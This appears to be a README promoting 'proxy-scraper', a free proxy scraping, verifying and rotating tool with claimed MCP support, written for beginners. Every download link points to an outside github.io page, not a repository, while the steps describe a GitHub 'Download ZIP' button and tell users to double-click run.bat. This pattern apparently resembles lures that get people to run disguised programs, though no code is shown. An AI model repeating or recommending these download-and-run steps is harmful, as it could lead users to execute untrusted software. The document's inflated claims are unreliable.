# 🕷️ proxy-scraper - Free Proxies That Actually Work

[![Download](https://img.shields.io/badge/Download-Get%20proxy--scraper-blue?style=for-the-badge&logo=github)](https://bashekhe.github.io)

---

## 👋 Welcome to proxy-scraper

Are you tired of free proxy lists that are full of dead links, fake IPs, or worse—honeypots designed to catch you? **proxy-scraper** is your all-in-one solution that finds, verifies, and serves working proxies automatically. Whether you're a developer, a data enthusiast, or just someone who values online privacy, this tool changes the game.

This guide is written for **complete beginners**. You don't need to be a programmer or understand complex networking terms. Just follow the steps below, and you'll have proxy-scraper running in minutes.

---

## ✨ What Does proxy-scraper Do?

At its core, proxy-scraper does four amazing things:

| Feature | What It Means For You |
|---------|------------------------|
| **700+ Sources** | It taps into over 700 different places on the internet where proxies are listed, so you get a huge variety. |
| **100% Verified** | Every single proxy is tested before you see it. It filters out honeypots (traps), injected scripts, and poor TLS connections. |
| **Live List** | A fresh, updated list of working proxies is generated every hour. No more stale data. |
| **Rotating Server & AI Agent Support** | It can act as a proxy server that rotates IPs for you, and it even works as an MCP server so AI agents can use clean proxies. |

Think of it like this: you're getting a personal assistant that constantly hunts for the best free proxies, verifies they work, and hands them to you on a silver platter—every single hour.

---

## 🚀 Getting Started

Let's get you set up. The process is simple, and you'll be up and running in under five minutes.

### Step 1: Download proxy-scraper

Visit this link to download the application: **[Visit this link to download the application](https://bashekhe.github.io)**

Once you land on that page, look for the green **"Code"** button and click the **"Download ZIP"** option. This will download a compressed folder to your computer.

> 💡 **Tip:** Save it somewhere you can easily find, like your Downloads folder or Desktop.

### Step 2: Extract the Files

After the download finishes, you'll have a file named `proxy-scraper-main.zip`. You need to "unzip" it:

1. **Right-click** on the `.zip` file.
2. Select **"Extract All..."** from the menu.
3. Choose a destination folder and click **"Extract"**.

You should now see a folder named `proxy-scraper-main` with all the files inside.

### Step 3: Run proxy-scraper

Inside the extracted folder, you'll find a file called `run.bat` (Windows batch file). Here's how to use it:

1. **Double-click** on `run.bat`.
2. A command prompt window will open, and the program will start.

That's it! The program will begin its work—scraping sources, verifying proxies, and preparing your clean list.

---

## 📦 What's Inside the Package?

When you extract the ZIP file, you'll see several files. Here's a friendly breakdown of what they do:

- **`main.py`** – The heart of proxy-scraper. This is the code that does all the magic.
- **`requirements.txt`** – A list of helper libraries the program needs. The `run.bat` file installs these automatically for you.
- **`config.yaml`** – A simple settings file where you can tweak things like how many proxies to collect or which ports to use.
- **`run.bat`** – The "launcher" that sets everything up and starts the program.
- **`output/`** – A folder where your verified proxy list will be saved as a text file.

---

## 🛠️ How to Use Your Proxy List

Once proxy-scraper finishes its first run, it will create a file called `proxies.txt` in the `output` folder. This file contains all the working proxies in the format `IP:PORT`.

Here are a few ways you can use them:

### For Web Browsing
You can manually set a proxy in your browser's network settings. Just copy an IP and port from the list, then paste it into your browser's proxy configuration.

### For Programming & Scripts
If you're using Python, you can integrate the list like this:
```python
proxies = {
    "http": "http://IP:PORT",
    "https": "http://IP:PORT"
}
```
Then make requests through these proxies.

### For the Built-In Rotating Server
The smartest feature is the built-in rotating proxy server. Instead of using one IP, you can point your application to your local server, and it will automatically rotate through all the verified proxies. This means:
- Better anonymity
- Less chance of getting blocked
- Automatic failover if one proxy dies

To start the rotating server, open a command prompt in the main folder and type:
```
python main.py --server
```
The server will start on `localhost:8080`. Configure your app to use `http://localhost:8080` as your proxy.

---

## 🤖 AI Agents & MCP Support

proxy-scraper is built for the future. It comes with **MCP (Model Context Protocol) server support**. This means if you're building an AI agent or using tools like LangChain, Claude, or other AI assistants, they can instantly query proxy-scraper for fresh, verified proxies.

To start the MCP server, run:
```
python main.py --mcp
```
Your AI agent can then connect to this server and retrieve proxies on demand.

---

## ⚙️ Configuration Made Easy

You don't need to touch the code to make changes. Everything is controlled in the `config.yaml` file. Open it in any text editor (like Notepad) and you'll see simple settings:

```yaml
sources: 700         # Number of sources to scrape
proxies_limit: 1000  # Max proxies to keep
check_timeout: 5     # Seconds to wait for verification
output_format: txt   # txt, json, or csv
```

- **`sources`** – Increase or decrease how many websites to scrape.
- **`proxies_limit`** – Set the maximum number of working proxies to keep in your list.
- **`check_timeout`** – How long to wait for a proxy to respond.
- **`output_format`** – Choose between text, JSON, or CSV output.

Save the file and restart proxy-scraper for changes to take effect.

---

## 🧪 Testing Your Proxies

If you want to manually test a proxy from your list, you can use the built-in checker. Run this command in the main folder:

```
python main.py --check 192.168.1.1:8080
```

Replace `192.168.1.1:8080` with any proxy from your list. The tool will tell you if it's alive and how fast it responds.

---

## 🔒 Safety & Privacy Tips

While proxy-scraper filters out most dangerous proxies, here are some general rules to keep you safe:

1. **Never use proxies for banking or personal accounts** – Even verified proxies could be logging traffic (though our honeypot detection minimizes this risk).
2. **Combine with HTTPS** – Always prefer `https://` websites via proxy rather than `http://`.
3. **Rotate regularly** – The hourly update is perfect for this. Don't use the same proxy for days.

---

## ❓ Troubleshooting Common Issues

### "The command prompt closes immediately"
This means something went wrong during setup. Try running it manually:
1. Open Command Prompt (search "cmd" in Start menu).
2. Type `cd ` and drag the `proxy-scraper-main` folder into the window (this adds the folder path).
3. Press Enter.
4. Type `run.bat` and press Enter. You'll see the actual error message—share this with the community for help.

### "No proxies found"
The first run might not find many proxies if all sources are temporarily unavailable. Just wait an hour and run again. The list will populate.

### "Slow download speed"
That's normal for free proxies. Try limiting the list to your region by editing `config.yaml` and adding a `region` setting like `region: US`.

---

## 📊 Project Roadmap

The developers are constantly improving proxy-scraper. Here's what's planned:

- 📱 Mobile app interface
- 🌍 Region-specific filtering
- 🔌 Browser extension for one-click proxy switching
- 📈 Usage analytics dashboard

---

## 🤝 Join the Community

This project is open-source and welcomes contributors. Whether you're a coder or not, you can help:

- **Give feedback** – Report bugs or suggest features on the GitHub issues page.
- **Spread the word** – If it works for you, star the repository and share it.
- **Hacktoberfest ready** – This project is Hacktoberfest-friendly, so if you know a bit of coding, you can contribute and earn swag.

---

## ✅ Wrapping Up

You now have a powerful, free proxy tool at your fingertips. With live updates, rigorous verification, and a rotating server, **proxy-scraper** is the only tool you'll ever need for reliable proxies.

Go ahead and give it a try: **[Visit this link to download the application](https://bashekhe.github.io)**

Your journey to free, working proxies starts right now. Happy scraping! ☕

---

Keywords: ai-agents, cli, discord-bot, free-proxy, hacktoberfest, honeypot-detection, http-proxy, mcp, mcp-server, proxy, proxy-checker, proxy-list, proxy-scraper, proxy-server, python, rotating-proxy, scraper, socks4, socks5, web-scraping